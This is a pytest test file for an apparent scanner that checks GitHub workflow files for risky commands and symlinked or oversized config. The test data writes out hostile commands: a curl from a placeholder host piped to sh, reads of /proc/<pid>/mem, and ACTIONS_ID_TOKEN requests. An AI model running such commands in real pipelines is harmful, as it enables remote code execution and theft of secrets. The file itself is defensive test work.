from pathlib import Path

from dev_guard.checks import scan
from dev_guard.patterns import MAX_FILE_BYTES

FIXTURES = Path(__file__).parent / "fixtures" / "h4"
MALICIOUS = FIXTURES / "malicious"
CLEAN = FIXTURES / "clean"

# 1-based lines in tests/fixtures/h4/malicious/.github/workflows/release.yaml
USES_V4, USES_MAIN, USES_NOREF, TOKEN = 7, 8, 9, 10
PROC_PID, PROC_SUBST, CURL_BODY = 12, 13, 14

CURL_SH = "curl -s https://example.invalid/x | sh"


def got(findings, severity=None):
    return {(f.check_id, f.severity, f.pattern, f.line) for f in findings
            if severity is None or f.severity == severity}


def wf(tmp_path, text, name="ci.yml", binary=False):
    d = tmp_path / ".github" / "workflows"
    d.mkdir(parents=True, exist_ok=True)
    (d / name).write_bytes(text if binary else text.encode())
    return scan(tmp_path, extra_files=())


def test_malicious_fixture():
    g = got(scan(MALICIOUS, extra_files=()))
    assert ("H4", "high", "actions_id_token", TOKEN) in g
    assert ("H4", "high", "proc_mem", PROC_PID) in g
    assert ("H4", "high", "proc_mem", PROC_SUBST) in g
    assert ("H4", "high", "network_fetch", CURL_BODY) in g
    assert ("H4", "high", "remote_shell", CURL_BODY) in g
    for n in (USES_V4, USES_MAIN, USES_NOREF):
        assert ("H4", "med", "unpinned_action", n) in g
    assert len(g) == 8  # name: curl and cpuinfo > a/mem are not flagged


def test_clean_fixture():
    assert scan(CLEAN, extra_files=()) == []


def test_no_line_text_in_findings():
    assert "FAKE_SECRET_TOKEN_H4" not in repr(scan(MALICIOUS, extra_files=()))


def test_block_with_comment(tmp_path):
    g = got(wf(tmp_path, f"steps:\n  - run: | # build step\n      {CURL_SH}\n"))
    assert ("H4", "high", "network_fetch", 3) in g


def test_crlf(tmp_path):
    g = got(wf(tmp_path, f"steps:\r\n  - run: |\r\n      {CURL_SH}\r\n".encode(), binary=True))
    assert ("H4", "high", "network_fetch", 3) in g


def test_dash_run_sibling_env_not_in_block(tmp_path):
    text = f"steps:\n  - run: |\n      echo hi\n    env:\n      X: curl https://example.invalid\n"
    assert got(wf(tmp_path, text)) == set()


def test_inline_run_then_sibling(tmp_path):
    text = "steps:\n  - run: echo hi\n    env:\n      X: curl https://example.invalid\n"
    assert got(wf(tmp_path, text)) == set()


def test_inline_run_flagged(tmp_path):
    assert ("H4", "high", "network_fetch", 2) in got(wf(tmp_path, f"steps:\n  - run: {CURL_SH}\n"))


def test_oversize_line(tmp_path):
    g = got(wf(tmp_path, "run: curl x|sh #" + "a" * 5000 + "\n"))
    assert {("H4", "high", "network_fetch", 1), ("H4", "high", "remote_shell", 1)} <= g
    g = got(wf(tmp_path, "env: ACTIONS_ID_TOKEN_REQUEST_URL " + "a" * 5000 + "\n"))
    assert ("H4", "high", "actions_id_token", 1) in g


def test_only_workflow_dir_scanned(tmp_path):
    (tmp_path / "workflows").mkdir()
    (tmp_path / "workflows" / "x.yml").write_text(f"run: {CURL_SH}\n")
    (tmp_path / ".github").mkdir()
    (tmp_path / ".github" / "x.yml").write_text(f"run: {CURL_SH}\n")
    assert scan(tmp_path, extra_files=()) == []


def test_case_insensitive_path(tmp_path):
    d = tmp_path / ".GITHUB" / "WORKFLOWS"
    d.mkdir(parents=True)
    (d / "CI.YML").write_text(f"run: {CURL_SH}\n")
    assert ("H4", "high", "network_fetch", 1) in got(scan(tmp_path, extra_files=()))


def test_oversize_file(tmp_path):
    g = got(wf(tmp_path, "#" * (MAX_FILE_BYTES + 1)))
    assert g == {("H4", "med", "oversize_file", 1)}


def test_symlinked_file(tmp_path):
    d = tmp_path / ".github" / "workflows"
    d.mkdir(parents=True)
    real = tmp_path / "real.txt"
    real.write_text("x")
    (d / "ci.yml").symlink_to(real)
    assert ("H4", "med", "symlinked_config", 1) in got(scan(tmp_path, extra_files=()))


def test_symlinked_github_dir(tmp_path):
    (tmp_path / "elsewhere").mkdir()
    (tmp_path / ".github").symlink_to(tmp_path / "elsewhere")
    assert ("H4", "med", "symlinked_config", 1) in got(scan(tmp_path, extra_files=()))


def test_symlinked_workflows_dir(tmp_path):
    (tmp_path / ".github").mkdir()
    (tmp_path / "elsewhere").mkdir()
    (tmp_path / ".github" / "workflows").symlink_to(tmp_path / "elsewhere")
    assert ("H4", "med", "symlinked_config", 1) in got(scan(tmp_path, extra_files=()))


import pytest


@pytest.mark.parametrize("cmd", ["cat /proc/$PID/mem", "cat /proc/${PID}/mem", "cat /proc/$(pgrep x)/mem"])
def test_proc_mem_variable_forms(tmp_path, cmd):
    assert ("H4", "high", "proc_mem", 1) in got(wf(tmp_path, f"run: {cmd}\n"))


def test_proc_mem_cpuinfo_not_flagged(tmp_path):
    assert not any(p == "proc_mem" for _, _, p, _ in got(wf(tmp_path, "run: cat /proc/cpuinfo > a/mem\n")))


@pytest.mark.parametrize("text", [
    '- "run": curl x|sh\n',
    "- 'run': curl x|sh\n",
    "- {run: curl x|sh}\n",
    "- {name: a, run: curl x|sh}\n",
    "- run: echo hi\n    curl x\n",
    '- run: "echo hi\n    curl x"\n',
    "- run: >-\n    curl x\n",
])
def test_run_yaml_forms(tmp_path, text):
    assert any(p == "network_fetch" for _, _, p, _ in got(wf(tmp_path, text)))


def test_run_continuation_ends_at_dedent(tmp_path):
    text = "steps:\n  - run: echo hi\n    name: curl\n  - name: curl\n"
    g = got(wf(tmp_path, text))
    assert not any(p == "network_fetch" for _, _, p, _ in g)
